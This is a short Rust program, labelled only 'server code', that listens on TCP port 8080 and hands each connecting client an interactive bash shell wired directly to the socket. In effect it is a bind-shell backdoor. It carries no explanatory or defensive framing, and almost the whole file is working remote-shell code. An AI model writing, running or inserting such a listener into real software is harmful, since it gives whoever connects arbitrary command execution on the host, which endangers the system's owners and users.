use std::net::{TcpStream, TcpListener};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
use std::thread;

/**
 * server code
 */
fn handle_client(stream: TcpStream) {
    let fd = stream.as_raw_fd(); 

    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait() 
        .unwrap();
    
}

fn main() {
    let listener = TcpListener::bind("127.0.0.1:8080").expect("Cannot bind port 8080 some application using that port!!"); 
    println!("Listening on port 8080");

    let mut num_connections = 0;

    for stream in listener.incoming() {
        let stream = stream.expect("An error occured while handling connections");
        thread::spawn(|| {
            handle_client(stream);
        });
        num_connections += 1;
    }
}